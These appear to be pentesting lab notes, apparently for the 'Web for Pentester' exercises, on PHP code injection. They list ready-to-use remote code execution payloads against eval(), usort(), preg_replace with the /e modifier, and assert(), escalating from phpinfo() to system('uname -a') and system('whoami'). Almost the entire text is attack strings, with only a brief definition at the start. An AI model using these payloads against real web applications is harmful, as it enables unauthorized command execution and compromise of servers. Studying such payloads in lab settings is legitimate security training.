<h2>Code Injection</h2>
Code Injection is the general term for attack types which consist of injecting code that is then interpreted/executed by the application. This type of attack exploits poor handling of untrusted data. These types of attacks are usually made possible due to a lack of proper input/output data validation

<h3>Web for Penterster</h3> 
<h3>example 1</h3> 
eval() - evaluates a string as PHP code

payload- " .phpinfo(). "
payload- " . hacker".system('uname -a');#       - change to RCE  & url encode need 


<h3>example 2</h3> 
usort()- Sort an array by values using a user-defined comparison function

payload-example2.php?order=id,system('whoami')
payload- example2.php?order=id);}system('whoami');#      - change to RCE  & url encode need 


<h3>example 3</h3> 
preg_replace() — Perform a regular expression search and replace

payload - example3.php?new=phpinfo()&pattern=/lamer/e&base=Hello lamer"
payload - example3.php?new=system('uname -a')&pattern=/lamer/e&base=Hello lamer         - change to RCE


<h3>example 4</h3> 
assert() - Checks if assertion is FALSE
payload - example4.php?name=hacker'.phpinfo().'
payload - example4.php?name=hacker'.system('uname -a').'
